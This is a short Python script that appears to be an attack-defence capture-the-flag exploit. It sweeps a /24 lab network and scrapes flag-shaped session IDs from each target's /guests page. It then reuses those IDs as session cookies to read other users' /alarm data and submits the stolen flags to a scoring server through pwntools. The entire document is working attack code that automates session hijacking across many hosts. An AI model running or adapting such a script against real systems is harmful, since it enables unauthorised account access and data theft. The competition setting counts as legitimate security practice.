import requests
from time import sleep
import re
from pwn import *

cosa = "10.0.13.37" 
port = "1337"


p = remote(cosa, port)

ff = "🏳️‍🌈\\X{4}"
rr = re.compile(r"🏳️‍🌈.+</p>")
def gen_ips():
    for x in range(1,256):
        if x != 150:
            yield f"10.0.0.{x}"


results = set()
fail = []
while True:
	for ip in gen_ips():
		flag = []
		if ip in fail:
			continue
		try:
			s = requests.Session()

			r = s.get(f"http://{ip}:7353", timeout=2)

			r = s.get(f"http://{ip}:7353/guests", timeout=2)

			ff = "🏳️‍🌈\\X{4}"
			rr = re.compile(r"<td>🏳️‍🌈\\X{4}</td>")

			rr2 = re.compile(r"</td><td>🏳️‍🌈\\X{4}</td>")
			for i in rr.findall(r.text):

				cookies = {'session_id': i[4:-5]}

				print(i)
				alarms = requests.get(f"http://{ip}:7353/alarm", cookies=cookies, timeout=2).text

				#print(alarms)
				print(rr2.findall(alarms))

				if (len(rr2.findall(alarms)) > 0):
					flag.append(rr2.findall(alarms)[0][9:-5])
		except:
			fail.append(ip)
			continue

        
		try:
			for i in flag:
				print(i)
				p.sendline(i)
		except:
			pass

	sleep(1)
p.close()
